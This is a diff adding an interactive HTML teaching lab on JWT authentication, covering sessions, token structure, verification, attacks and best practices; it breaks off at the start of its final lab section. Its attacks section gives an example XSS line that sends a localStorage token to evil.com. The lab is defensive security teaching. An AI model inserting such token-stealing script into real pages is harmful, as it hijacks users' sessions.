@@ -1,0 +1,787 @@
+
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:var(--font-mono,'Courier New',monospace)}
+.lab{background:#0d1117;color:#c9d1d9;min-height:100vh;padding:0;border-radius:var(--border-radius-lg)}
+.hero{background:#0d1117;border-bottom:1px solid #21262d;padding:2rem 2rem 1.5rem;text-align:center}
+.hero h1{font-size:20px;font-weight:500;color:#58a6ff;letter-spacing:-0.3px;margin-bottom:6px;font-family:var(--font-mono)}
+.hero p{font-size:13px;color:#8b949e;font-family:var(--font-sans)}
+.nav{display:flex;overflow-x:auto;gap:2px;padding:0 1rem;background:#161b22;border-bottom:1px solid #21262d}
+.nav-btn{padding:10px 14px;font-size:11px;color:#8b949e;background:none;border:none;cursor:pointer;white-space:nowrap;border-bottom:2px solid transparent;font-family:var(--font-mono);transition:color 0.2s}
+.nav-btn:hover{color:#c9d1d9}
+.nav-btn.active{color:#58a6ff;border-bottom-color:#58a6ff}
+.section{display:none;padding:1.5rem 2rem;animation:fadeIn 0.3s ease}
+.section.active{display:block}
+@keyframes fadeIn{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}
+.section-header{margin-bottom:1.5rem}
+.section-tag{font-size:11px;color:#58a6ff;font-family:var(--font-mono);margin-bottom:4px}
+.section-title{font-size:18px;font-weight:500;color:#e6edf3;font-family:var(--font-sans)}
+.section-subtitle{font-size:13px;color:#8b949e;margin-top:4px;font-family:var(--font-sans);line-height:1.6}
+.concept-box{background:#161b22;border:1px solid #21262d;border-radius:8px;padding:1.25rem;margin-bottom:1rem}
+.concept-box.highlight{border-color:#58a6ff33;background:#0c1929}
+.concept-box.warning{border-color:#f0883e55;background:#1a0f00}
+.concept-box.danger{border-color:#f8514933;background:#1a0000}
+.concept-box.success{border-color:#3fb95033;background:#001a08}
+.cb-title{font-size:12px;font-weight:500;color:#8b949e;font-family:var(--font-mono);margin-bottom:8px;text-transform:uppercase;letter-spacing:0.5px}
+.cb-title.blue{color:#58a6ff}
+.cb-title.amber{color:#e3b341}
+.cb-title.red{color:#f85149}
+.cb-title.green{color:#3fb950}
+.cb-body{font-size:13px;color:#c9d1d9;line-height:1.7;font-family:var(--font-sans)}
+.flow{display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin:1rem 0}
+.flow-node{background:#21262d;border:1px solid #30363d;border-radius:6px;padding:6px 12px;font-size:12px;color:#c9d1d9;font-family:var(--font-mono);white-space:nowrap}
+.flow-node.active-node{background:#0c1929;border-color:#58a6ff;color:#58a6ff}
+.flow-node.server{background:#0f1a0f;border-color:#3fb950;color:#3fb950}
+.flow-node.client{background:#1a0c29;border-color:#bc8cff;color:#bc8cff}
+.flow-arrow{color:#30363d;font-size:16px}
+.terminal{background:#010409;border:1px solid #21262d;border-radius:8px;padding:1.25rem;font-family:var(--font-mono);font-size:12px;line-height:1.8;margin:1rem 0}
+.terminal .prompt{color:#3fb950}
+.terminal .key{color:#79c0ff}
+.terminal .val{color:#a5d6ff}
+.terminal .str{color:#a8ff87}
+.terminal .comment{color:#484f58}
+.terminal .error{color:#f85149}
+.terminal .success{color:#3fb950}
+.terminal .warn{color:#e3b341}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin:1rem 0}
+.grid3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:1rem;margin:1rem 0}
+.sim-btn{background:#21262d;border:1px solid #30363d;border-radius:6px;padding:8px 16px;font-size:12px;color:#c9d1d9;cursor:pointer;font-family:var(--font-mono);transition:all 0.2s;margin:4px 4px 4px 0}
+.sim-btn:hover{background:#30363d;border-color:#58a6ff;color:#58a6ff}
+.sim-btn.danger-btn{border-color:#f8514933;color:#f85149}
+.sim-btn.danger-btn:hover{background:#1a0000;border-color:#f85149}
+.sim-btn.success-btn{border-color:#3fb95033;color:#3fb950}
+.sim-btn.success-btn:hover{background:#001a08;border-color:#3fb950}
+.sim-output{background:#010409;border:1px solid #21262d;border-radius:6px;padding:1rem;font-family:var(--font-mono);font-size:12px;min-height:60px;line-height:1.8;margin-top:8px;transition:all 0.3s}
+.mem-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(80px,1fr));gap:6px;margin:1rem 0}
+.mem-slot{background:#21262d;border:1px solid #30363d;border-radius:4px;padding:8px;font-size:10px;font-family:var(--font-mono);text-align:center;transition:all 0.3s}
+.mem-slot.used{background:#0c1929;border-color:#58a6ff;color:#58a6ff}
+.mem-slot.empty{color:#484f58}
+.jwt-display{margin:1rem 0}
+.jwt-raw{background:#010409;border:1px solid #21262d;border-radius:8px;padding:1rem;font-family:var(--font-mono);font-size:11px;word-break:break-all;line-height:1.8}
+.jwt-part{cursor:pointer;border-radius:3px;padding:1px 2px;transition:opacity 0.2s}
+.jwt-part:hover{opacity:0.8}
+.jwt-h{color:#ff7b72}
+.jwt-p{color:#79c0ff}
+.jwt-s{color:#a5d6ff}
+.jwt-detail{display:none;background:#161b22;border-radius:6px;padding:1rem;margin-top:8px;font-size:12px;animation:fadeIn 0.2s}
+.jwt-detail.show{display:block}
+.badge{display:inline-block;padding:2px 8px;border-radius:4px;font-size:10px;font-family:var(--font-mono);margin:2px}
+.badge-red{background:#1a0000;border:1px solid #f8514933;color:#f85149}
+.badge-green{background:#001a08;border:1px solid #3fb95033;color:#3fb950}
+.badge-blue{background:#0c1929;border:1px solid #58a6ff33;color:#58a6ff}
+.badge-amber{background:#1a0f00;border:1px solid #e3b34133;color:#e3b341}
+.badge-purple{background:#1a0929;border:1px solid #bc8cff33;color:#bc8cff}
+.attack-card{background:#161b22;border:1px solid #f8514922;border-radius:8px;padding:1.25rem;margin-bottom:1rem}
+.attack-title{font-size:13px;font-weight:500;color:#f85149;font-family:var(--font-mono);margin-bottom:8px}
+.step-list{list-style:none;padding:0}
+.step-list li{padding:6px 0;font-size:13px;color:#c9d1d9;font-family:var(--font-sans);display:flex;align-items:flex-start;gap:8px}
+.step-list li::before{content:"→";color:#58a6ff;font-family:var(--font-mono);flex-shrink:0;margin-top:1px}
+.compare-row{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin-bottom:8px}
+.compare-cell{background:#161b22;border:1px solid #21262d;border-radius:6px;padding:1rem}
+.compare-label{font-size:11px;color:#8b949e;font-family:var(--font-mono);margin-bottom:6px}
+.compare-val{font-size:13px;color:#c9d1d9;font-family:var(--font-sans)}
+.analogy-box{background:#161b22;border:1px solid #bc8cff33;border-radius:8px;padding:1.25rem;margin:1rem 0;display:grid;grid-template-columns:1fr 1fr;gap:1rem}
+.analogy-side{text-align:center}
+.analogy-icon{font-size:32px;margin-bottom:6px}
+.analogy-label{font-size:12px;color:#8b949e;font-family:var(--font-mono)}
+.analogy-desc{font-size:12px;color:#c9d1d9;font-family:var(--font-sans);margin-top:4px}
+.best-practice{display:flex;align-items:flex-start;gap:12px;padding:12px 0;border-bottom:1px solid #21262d}
+.best-practice:last-child{border-bottom:none}
+.bp-check{color:#3fb950;font-family:var(--font-mono);font-size:14px;flex-shrink:0;margin-top:1px}
+.bp-content h4{font-size:13px;font-weight:500;color:#e6edf3;font-family:var(--font-sans);margin-bottom:2px}
+.bp-content p{font-size:12px;color:#8b949e;font-family:var(--font-sans);line-height:1.6}
+.lab-input{background:#010409;border:1px solid #30363d;border-radius:6px;padding:8px 12px;font-size:12px;color:#c9d1d9;font-family:var(--font-mono);width:100%;margin-bottom:8px;outline:none}
+.lab-input:focus{border-color:#58a6ff}
+.lab-section{background:#161b22;border-radius:8px;padding:1.25rem;margin-bottom:1rem}
+.lab-task{font-size:12px;color:#e3b341;font-family:var(--font-mono);margin-bottom:8px}
+.progress-bar{background:#21262d;border-radius:4px;height:4px;margin-bottom:1.5rem;overflow:hidden}
+.progress-fill{height:100%;background:#58a6ff;border-radius:4px;transition:width 0.4s}
+.nav-footer{display:flex;justify-content:space-between;padding:1rem 2rem;border-top:1px solid #21262d;background:#0d1117}
+.nav-footer button{background:#21262d;border:1px solid #30363d;border-radius:6px;padding:8px 16px;font-size:12px;color:#c9d1d9;cursor:pointer;font-family:var(--font-mono)}
+.nav-footer button:hover{background:#30363d}
+.section-num{font-size:11px;color:#484f58;font-family:var(--font-mono);margin-top:4px}
+</style>
+
+<div class="lab">
+
+<div class="hero">
+  <h1>// JWT Lab: From Sessions to Token-Based Auth</h1>
+  <p>Understand the Problem → Learn the Solution → Explore the Security</p>
+</div>
+
+<div style="padding:0 2rem;padding-top:8px">
+  <div class="progress-bar"><div class="progress-fill" id="progress" style="width:10%"></div></div>
+</div>
+
+<div class="nav" id="nav">
+  <button class="nav-btn active" onclick="goto(0)">01. Sessions</button>
+  <button class="nav-btn" onclick="goto(1)">02. Problem</button>
+  <button class="nav-btn" onclick="goto(2)">03. JWT Intro</button>
+  <button class="nav-btn" onclick="goto(3)">04. How JWT Works</button>
+  <button class="nav-btn" onclick="goto(4)">05. Structure</button>
+  <button class="nav-btn" onclick="goto(5)">06. Real Requests</button>
+  <button class="nav-btn" onclick="goto(6)">07. Attacks</button>
+  <button class="nav-btn" onclick="goto(7)">08. Comparison</button>
+  <button class="nav-btn" onclick="goto(8)">09. Best Practices</button>
+  <button class="nav-btn" onclick="goto(9)">10. Lab</button>
+</div>
+
+<!-- SECTION 1: SESSION AUTH -->
+<div class="section active" id="s0">
+  <div class="section-header">
+    <div class="section-tag">// section 01</div>
+    <div class="section-title">Traditional: Session-Based Authentication</div>
+    <div class="section-subtitle">What happens after you log in — the old way</div>
+  </div>
+
+  <div class="concept-box highlight">
+    <div class="cb-title blue">the big idea</div>
+    <div class="cb-body">After login, the <strong style="color:#e6edf3">server creates a session</strong>, stores it in memory, and gives the client a ticket (session ID). Every request, the client shows that ticket and the server looks it up.</div>
+  </div>
+
+  <div class="concept-box">
+    <div class="cb-title">request/response flow</div>
+    <div class="flow">
+      <div class="flow-node client">Browser</div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-node">POST /login<br>user+password</div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-node server">Server</div>
+    </div>
+    <div class="flow">
+      <div class="flow-node server">Server</div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-node active-node">Creates session<br>session_id: abc123</div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-node">Stores in DB/RAM</div>
+    </div>
+    <div class="flow">
+      <div class="flow-node server">Server</div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-node">Set-Cookie:<br>session=abc123</div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-node client">Browser saves cookie</div>
+    </div>
+    <div class="flow">
+      <div class="flow-node client">Every request →</div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-node">Cookie: session=abc123</div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-node server">Server looks up session</div>
+    </div>
+  </div>
+
+  <div class="terminal">
+    <span class="comment"># What the server stores in memory for each user:</span><br>
+    <span class="key">sessions</span> = {<br>
+    &nbsp;&nbsp;<span class="str">"abc123"</span>: { <span class="key">user_id</span>: <span class="val">42</span>, <span class="key">role</span>: <span class="str">"user"</span>, <span class="key">created</span>: <span class="str">"10:30am"</span> },<br>
+    &nbsp;&nbsp;<span class="str">"xyz789"</span>: { <span class="key">user_id</span>: <span class="val">7</span>, <span class="key">role</span>: <span class="str">"admin"</span>, <span class="key">created</span>: <span class="str">"10:31am"</span> },<br>
+    &nbsp;&nbsp;<span class="comment">... one entry per logged-in user ...</span><br>
+    }
+  </div>
+
+  <div class="concept-box">
+    <div class="cb-title">key insight</div>
+    <div class="cb-body">The session ID in the cookie is just a <strong style="color:#e6edf3">random key</strong>. The actual data (who you are, your role) lives on the server. The cookie is just a lookup key.</div>
+  </div>
+</div>
+
+<!-- SECTION 2: PROBLEM -->
+<div class="section" id="s1">
+  <div class="section-header">
+    <div class="section-tag">// section 02</div>
+    <div class="section-title">The Problem with Sessions</div>
+    <div class="section-subtitle">Why sessions break at scale</div>
+  </div>
+
+  <div class="concept-box warning">
+    <div class="cb-title amber">core problem</div>
+    <div class="cb-body">The server must <strong style="color:#e3b341">remember every user</strong>. This creates serious problems in real-world systems.</div>
+  </div>
+
+  <div class="grid2">
+    <div class="concept-box">
+      <div class="cb-title amber">problem 1: memory</div>
+      <div class="cb-body" style="font-size:12px">Each session takes RAM. 10,000 users = 10,000 sessions stored. Memory fills up as users grow.</div>
+    </div>
+    <div class="concept-box">
+      <div class="cb-title amber">problem 2: restart</div>
+      <div class="cb-body" style="font-size:12px">Server crashes or restarts → RAM is wiped → ALL sessions lost → every user is logged out instantly.</div>
+    </div>
+    <div class="concept-box">
+      <div class="cb-title amber">problem 3: scaling</div>
+      <div class="cb-body" style="font-size:12px">Add a second server (Server B) — it has no sessions from Server A. User gets routed to B → treated as a stranger.</div>
+    </div>
+    <div class="concept-box">
+      <div class="cb-title amber">problem 4: sharing</div>
+      <div class="cb-body" style="font-size:12px">Microservices need to share session data. Requires a central session store — another point of failure and complexity.</div>
+    </div>
+  </div>
+
+  <div class="concept-box">
+    <div class="cb-title">simulation: server memory</div>
+    <div class="cb-body" style="margin-bottom:12px">Watch what happens as users log in and then the server restarts.</div>
+    <div id="mem-display" class="mem-grid"></div>
+    <div style="margin-top:8px">
+      <button class="sim-btn" onclick="addUser()">+ Add User Login</button>
+      <button class="sim-btn danger-btn" onclick="serverRestart()">Server Restart</button>
+    </div>
+    <div class="sim-output" id="mem-output"><span style="color:#484f58">Click "Add User Login" to fill sessions...</span></div>
+  </div>
+</div>
+
+<!-- SECTION 3: JWT INTRO -->
+<div class="section" id="s2">
+  <div class="section-header">
+    <div class="section-tag">// section 03</div>
+    <div class="section-title">JWT: The Solution</div>
+    <div class="section-subtitle">What if the client carries its own proof of identity?</div>
+  </div>
+
+  <div class="concept-box success">
+    <div class="cb-title green">the big shift</div>
+    <div class="cb-body">Instead of the server remembering you, the server <strong style="color:#3fb950">gives you a signed token</strong> after login. You carry it. You prove who you are on every request. The server just verifies the signature — no memory needed.</div>
+  </div>
+
+  <div class="concept-box">
+    <div class="cb-title">JWT = JSON Web Token</div>
+    <div class="cb-body">A JWT is a small text string containing three parts: user data (payload), metadata (header), and a cryptographic signature that proves the data wasn't tampered with.</div>
+  </div>
+
+  <div class="terminal">
+    <span class="comment"># Session approach — server must remember</span><br>
+    <span class="error">Server RAM: { session_id → user_data } ← grows forever</span><br><br>
+    <span class="comment"># JWT approach — client carries the data</span><br>
+    <span class="success">Client stores: eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo0Mn0.signature</span><br>
+    <span class="success">Server only needs: secret_key to verify</span>
+  </div>
+
+  <div class="grid2">
+    <div class="concept-box">
+      <div class="cb-title">session model</div>
+      <div class="cb-body" style="font-size:12px">
+        Client → sends cookie ID<br>
+        Server → looks up session table<br>
+        Server → finds user data<br>
+        Server → allows/denies
+      </div>
+    </div>
+    <div class="concept-box success">
+      <div class="cb-title green">JWT model</div>
+      <div class="cb-body" style="font-size:12px">
+        Client → sends token (with data inside)<br>
+        Server → verifies signature<br>
+        Server → reads data from token<br>
+        Server → allows/denies
+      </div>
+    </div>
+  </div>
+
+  <div class="concept-box warning">
+    <div class="cb-title amber">important note</div>
+    <div class="cb-body">JWT is <strong style="color:#e3b341">encoded</strong> (base64), not encrypted. Anyone can read the payload. The signature only proves it wasn't modified — it doesn't hide the data. Never put passwords or secrets in the payload.</div>
+  </div>
+</div>
+
+<!-- SECTION 4: HOW JWT WORKS -->
+<div class="section" id="s3">
+  <div class="section-header">
+    <div class="section-tag">// section 04</div>
+    <div class="section-title">How JWT Works: Step by Step</div>
+    <div class="section-subtitle">Follow the complete authentication flow</div>
+  </div>
+
+  <div class="concept-box">
+    <div class="cb-title">step-by-step flow</div>
+    <div id="flow-steps">
+      <div class="flow" id="step-display" style="flex-direction:column;align-items:flex-start;gap:6px"></div>
+    </div>
+    <button class="sim-btn" onclick="nextFlowStep()">Next Step →</button>
+    <button class="sim-btn" onclick="resetFlow()">Reset</button>
+    <div class="sim-output" id="flow-output"><span style="color:#484f58">Click "Next Step" to begin the JWT flow...</span></div>
+  </div>
+
+  <div class="concept-box">
+    <div class="cb-title">what happens at each stage</div>
+    <div class="step-list">
+      <li>User sends credentials (username + password) to the server</li>
+      <li>Server checks credentials against the database</li>
+      <li>If valid, server creates a JWT with user info and signs it with a secret key</li>
+      <li>Server sends JWT back to client in the response</li>
+      <li>Client stores JWT (cookie or localStorage)</li>
+      <li>For every protected request, client adds JWT in Authorization header</li>
+      <li>Server receives request, verifies JWT signature using the same secret key</li>
+      <li>If valid, server reads user info from token and grants access — no DB lookup needed</li>
+    </div>
+  </div>
+</div>
+
+<!-- SECTION 5: STRUCTURE -->
+<div class="section" id="s4">
+  <div class="section-header">
+    <div class="section-tag">// section 05</div>
+    <div class="section-title">JWT Structure</div>
+    <div class="section-subtitle">Three parts, separated by dots — click each to explore</div>
+  </div>
+
+  <div class="jwt-display">
+    <div style="font-size:11px;color:#8b949e;font-family:var(--font-mono);margin-bottom:6px">// a real JWT token:</div>
+    <div class="jwt-raw">
+      <span class="jwt-part jwt-h" onclick="showPart('header')" title="Click to inspect">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span><span style="color:#484f58">.</span><span class="jwt-part jwt-p" onclick="showPart('payload')" title="Click to inspect">eyJ1c2VyX2lkIjo0Miwicm9sZSI6InVzZXIiLCJleHAiOjE3MTYyMzkwMjJ9</span><span style="color:#484f58">.</span><span class="jwt-part jwt-s" onclick="showPart('sig')" title="Click to inspect">SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</span>
+    </div>
+    <div style="display:flex;gap:12px;margin-top:8px;font-size:11px;font-family:var(--font-mono)">
+      <span style="color:#ff7b72">■ header</span>
+      <span style="color:#79c0ff">■ payload</span>
+      <span style="color:#a5d6ff">■ signature</span>
+      <span style="color:#484f58">← click each part</span>
+    </div>
+  </div>
+
+  <div class="jwt-detail" id="d-header">
+    <div class="cb-title red">header — algorithm metadata</div>
+    <div class="terminal" style="margin:8px 0">
+      <span class="comment">// decoded header:</span><br>
+      {<br>
+      &nbsp;&nbsp;<span class="key">"alg"</span>: <span class="str">"HS256"</span>, <span class="comment">// algorithm: HMAC SHA-256</span><br>
+      &nbsp;&nbsp;<span class="key">"typ"</span>: <span class="str">"JWT"</span> &nbsp;&nbsp;<span class="comment">// token type</span><br>
+      }
+    </div>
+    <div class="cb-body" style="font-size:12px">The header tells the server <strong style="color:#e6edf3">which algorithm</strong> was used to create the signature. HS256 uses a shared secret key. RS256 uses public/private key pairs.</div>
+  </div>
+
+  <div class="jwt-detail" id="d-payload">
+    <div class="cb-title blue">payload — user claims (readable by anyone!)</div>
+    <div class="terminal" style="margin:8px 0">
+      <span class="comment">// decoded payload:</span><br>
+      {<br>
+      &nbsp;&nbsp;<span class="key">"user_id"</span>: <span class="val">42</span>, &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="comment">// who you are</span><br>
+      &nbsp;&nbsp;<span class="key">"role"</span>: <span class="str">"user"</span>, &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="comment">// your permissions</span><br>
+      &nbsp;&nbsp;<span class="key">"exp"</span>: <span class="val">1716239022</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="comment">// expires (unix timestamp)</span><br>
+      }
+    </div>
+    <div class="cb-body" style="font-size:12px"><strong style="color:#f85149">WARNING:</strong> This is base64 encoded, NOT encrypted. Anyone who gets this token can decode and read the payload. Never store passwords, credit cards, or sensitive data here.</div>
+  </div>
+
+  <div class="jwt-detail" id="d-sig">
+    <div class="cb-title" style="color:#a5d6ff">signature — tamper-proof seal</div>
+    <div class="terminal" style="margin:8px 0">
+      <span class="comment">// how the signature is created:</span><br>
+      signature = HMAC_SHA256(<br>
+      &nbsp;&nbsp;base64(header) + <span class="str">"."</span> + base64(payload),<br>
+      &nbsp;&nbsp;<span class="key">SECRET_KEY</span> <span class="comment">// only the server knows this</span><br>
+      )
+    </div>
+    <div class="cb-body" style="font-size:12px">If an attacker changes even one character in the payload, the signature will no longer match. The server rejects any token where header+payload doesn't produce the same signature using its secret key.</div>
+  </div>
+
+  <div class="concept-box warning">
+    <div class="cb-title amber">key insight: encoding vs encryption</div>
+    <div class="cb-body">Base64 is just a <strong style="color:#e3b341">text encoding format</strong> — like translating English to Morse code. It's not encryption. Any website (like jwt.io) can decode a JWT instantly. The only security comes from the <strong style="color:#e3b341">signature</strong>.</div>
+  </div>
+</div>
+
+<!-- SECTION 6: REAL REQUESTS -->
+<div class="section" id="s5">
+  <div class="section-header">
+    <div class="section-tag">// section 06</div>
+    <div class="section-title">JWT in Real API Requests</div>
+    <div class="section-subtitle">See how tokens are sent and verified in practice</div>
+  </div>
+
+  <div class="concept-box">
+    <div class="cb-title">real HTTP request with JWT</div>
+    <div class="terminal">
+      <span class="prompt">GET /api/profile HTTP/1.1</span><br>
+      <span class="key">Host:</span> <span class="val">api.example.com</span><br>
+      <span class="key">Authorization:</span> <span class="str">Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo0Mn0.sig</span><br>
+      <span class="key">Content-Type:</span> <span class="val">application/json</span>
+    </div>
+    <div class="cb-body" style="font-size:12px;margin-top:8px">The word <span style="color:#e3b341;font-family:var(--font-mono)">Bearer</span> is the standard prefix. It tells the server the credential type is a bearer token (whoever holds it, bears it).</div>
+  </div>
+
+  <div class="concept-box">
+    <div class="cb-title">simulation: send a request</div>
+    <div class="cb-body" style="margin-bottom:12px">Try sending requests with different tokens and see how the server responds.</div>
+    <button class="sim-btn success-btn" onclick="sendRequest('valid')">Send Valid Token</button>
+    <button class="sim-btn danger-btn" onclick="sendRequest('modified')">Send Modified Token</button>
+    <button class="sim-btn danger-btn" onclick="sendRequest('expired')">Send Expired Token</button>
+    <button class="sim-btn danger-btn" onclick="sendRequest('none')">Send No Token</button>
+    <div class="sim-output" id="req-output"><span style="color:#484f58">Select a request to send...</span></div>
+  </div>
+
+  <div class="concept-box">
+    <div class="cb-title">server-side verification logic</div>
+    <div class="terminal">
+      <span class="comment"># pseudocode: what the server does on each request</span><br>
+      <span class="key">def</span> verify_jwt(token, secret_key):<br>
+      &nbsp;&nbsp;header, payload, signature = token.split(<span class="str">"."</span>)<br>
+      &nbsp;&nbsp;expected = HMAC(header + <span class="str">"."</span> + payload, secret_key)<br>
+      &nbsp;&nbsp;<span class="key">if</span> signature != expected:<br>
+      &nbsp;&nbsp;&nbsp;&nbsp;<span class="error">raise InvalidSignature → 401 Unauthorized</span><br>
+      &nbsp;&nbsp;<span class="key">if</span> payload[<span class="str">"exp"</span>] &lt; now():<br>
+      &nbsp;&nbsp;&nbsp;&nbsp;<span class="error">raise TokenExpired → 401 Unauthorized</span><br>
+      &nbsp;&nbsp;<span class="success">return payload  # trust the data inside</span>
+    </div>
+  </div>
+</div>
+
+<!-- SECTION 7: ATTACKS -->
+<div class="section" id="s6">
+  <div class="section-header">
+    <div class="section-tag">// section 07</div>
+    <div class="section-title">JWT Vulnerabilities — Attacker's View</div>
+    <div class="section-subtitle">Think like an attacker. Understand how JWT can be exploited.</div>
+  </div>
+
+  <div class="attack-card">
+    <div class="attack-title">attack 1: payload tampering</div>
+    <div class="cb-body" style="margin-bottom:10px;font-size:12px">Attacker decodes payload (it's just base64), changes role from "user" to "admin", re-encodes it, and sends it.</div>
+    <div class="terminal" style="font-size:11px">
+      <span class="comment"># original payload</span><br>
+      { <span class="key">"user_id"</span>: 42, <span class="key">"role"</span>: <span class="str">"user"</span> }<br><br>
+      <span class="comment"># attacker modifies it</span><br>
+      { <span class="key">"user_id"</span>: 42, <span class="key">"role"</span>: <span class="str"><span style="text-decoration:line-through">user</span> → "admin"</span> }
+    </div>
+    <button class="sim-btn danger-btn" onclick="simAttack('tamper', false)">Attack: No Sig Check</button>
+    <button class="sim-btn success-btn" onclick="simAttack('tamper', true)">Attack: With Sig Check</button>
+    <div class="sim-output" id="atk1-output"><span style="color:#484f58">Run simulation...</span></div>
+  </div>
+
+  <div class="attack-card">
+    <div class="attack-title">attack 2: weak secret key</div>
+    <div class="cb-body" style="margin-bottom:10px;font-size:12px">If the server uses a weak secret key like "secret" or "password123", an attacker can brute-force it offline and then forge any token.</div>
+    <button class="sim-btn danger-btn" onclick="simAttack('brute', false)">Simulate Brute Force (weak key)</button>
+    <button class="sim-btn success-btn" onclick="simAttack('brute', true)">Simulate (strong key)</button>
+    <div class="sim-output" id="atk2-output"><span style="color:#484f58">Run simulation...</span></div>
+  </div>
+
+  <div class="attack-card">
+    <div class="attack-title">attack 3: token theft via XSS</div>
+    <div class="cb-body" style="margin-bottom:10px;font-size:12px">If JWT is stored in localStorage, any JavaScript on the page can access it — including injected malicious scripts.</div>
+    <div class="terminal" style="font-size:11px">
+      <span class="comment"># attacker injects this script into your page:</span><br>
+      <span class="error">fetch("https://evil.com?token=" + localStorage.getItem("jwt"))</span>
+    </div>
+    <button class="sim-btn danger-btn" onclick="simAttack('xss', false)">Simulate XSS Theft (localStorage)</button>
+    <button class="sim-btn success-btn" onclick="simAttack('xss', true)">With httpOnly Cookie</button>
+    <div class="sim-output" id="atk3-output"><span style="color:#484f58">Run simulation...</span></div>
+  </div>
+
+  <div class="attack-card">
+    <div class="attack-title">attack 4: no expiration</div>
+    <div class="cb-body" style="margin-bottom:10px;font-size:12px">A token without an "exp" claim never expires. If stolen, the attacker can use it forever — even after the user changes their password.</div>
+    <button class="sim-btn danger-btn" onclick="simAttack('noexp', false)">Token Without exp (stolen)</button>
+    <button class="sim-btn success-btn" onclick="simAttack('noexp', true)">Token With exp</button>
+    <div class="sim-output" id="atk4-output"><span style="color:#484f58">Run simulation...</span></div>
+  </div>
+</div>
+
+<!-- SECTION 8: COMPARISON -->
+<div class="section" id="s7">
+  <div class="section-header">
+    <div class="section-tag">// section 08</div>
+    <div class="section-title">Session vs JWT</div>
+    <div class="section-subtitle">Side-by-side comparison of both approaches</div>
+  </div>
+
+  <div class="analogy-box">
+    <div class="analogy-side">
+      <div class="analogy-icon" style="font-size:28px;margin-bottom:4px">🎫</div>
+      <div class="analogy-label" style="color:#e3b341">Session = Cloakroom Ticket</div>
+      <div class="analogy-desc">You hand in your coat (data stays with server). You get a number. You show the number, they find your coat.</div>
+    </div>
+    <div class="analogy-side" style="border-left:1px solid #21262d">
+      <div class="analogy-icon" style="font-size:28px;margin-bottom:4px">🪪</div>
+      <div class="analogy-label" style="color:#58a6ff">JWT = ID Card</div>
+      <div class="analogy-desc">Your data is printed on your card. You carry it. Anyone who trusts the issuer just reads the card directly.</div>
+    </div>
+  </div>
+
+  <div class="compare-row" style="margin-top:1rem">
+    <div style="font-size:11px;color:#8b949e;font-family:var(--font-mono);text-align:center;padding:4px">SESSIONS</div>
+    <div style="font-size:11px;color:#8b949e;font-family:var(--font-mono);text-align:center;padding:4px">JWT</div>
+  </div>
+
+  <div id="compare-rows"></div>
+</div>
+
+<!-- SECTION 9: BEST PRACTICES -->
+<div class="section" id="s8">
+  <div class="section-header">
+    <div class="section-tag">// section 09</div>
+    <div class="section-title">Best Practices</div>
+    <div class="section-subtitle">How to use JWT securely in production</div>
+  </div>
+
+  <div class="concept-box">
+    <div class="cb-title">security checklist</div>
+    <div>
+      <div class="best-practice">
+        <div class="bp-check">✓</div>
+        <div class="bp-content">
+          <h4>Use a strong, random secret key</h4>
+          <p>Minimum 256 bits of entropy. Never use predictable values like "secret", your app name, or short strings. Use a proper random generator: <span style="font-family:var(--font-mono);color:#8b949e">openssl rand -hex 32</span></p>
+        </div>
+      </div>
+      <div class="best-practice">
+        <div class="bp-check">✓</div>
+        <div class="bp-content">
+          <h4>Always validate the signature</h4>
+          <p>Never skip verification. Never trust the payload before confirming the signature matches. Accept only algorithms you explicitly allow — never accept "alg: none".</p>
+        </div>
+      </div>
+      <div class="best-practice">
+        <div class="bp-check">✓</div>
+        <div class="bp-content">
+          <h4>Set a short expiration (exp claim)</h4>
+          <p>Short-lived tokens (15 minutes to 1 hour) limit damage if stolen. Use refresh tokens for maintaining sessions without long-lived access tokens.</p>
+        </div>
+      </div>
+      <div class="best-practice">
+        <div class="bp-check">✓</div>
+        <div class="bp-content">
+          <h4>Store JWT in httpOnly cookies</h4>
+          <p>HttpOnly cookies cannot be accessed by JavaScript — XSS attacks cannot steal them. Pair with SameSite=Strict and Secure flags for full protection.</p>
+        </div>
+      </div>
+      <div class="best-practice">
+        <div class="bp-check">✓</div>
+        <div class="bp-content">
+          <h4>Never put sensitive data in the payload</h4>
+          <p>The payload is just base64 encoded — anyone can read it. Only store non-sensitive identifiers: user ID, role, expiration. No passwords, SSNs, or PII.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="terminal">
+    <span class="comment"># secure JWT configuration example</span><br>
+    jwt.sign(payload, <span class="key">SECRET_KEY</span>, {<br>
+    &nbsp;&nbsp;<span class="key">algorithm</span>: <span class="str">"HS256"</span>, &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="success">✓ explicit algorithm</span><br>
+    &nbsp;&nbsp;<span class="key">expiresIn</span>: <span class="str">"15m"</span>, &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="success">✓ short expiry</span><br>
+    &nbsp;&nbsp;<span class="key">issuer</span>: <span class="str">"myapp.com"</span>, &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="success">✓ identify the issuer</span><br>
+    })
+  </div>
+</div>
+
+<!-- SECTION 10: LAB -->
+<div class="section" id="s9">
+  <div class="section-header">
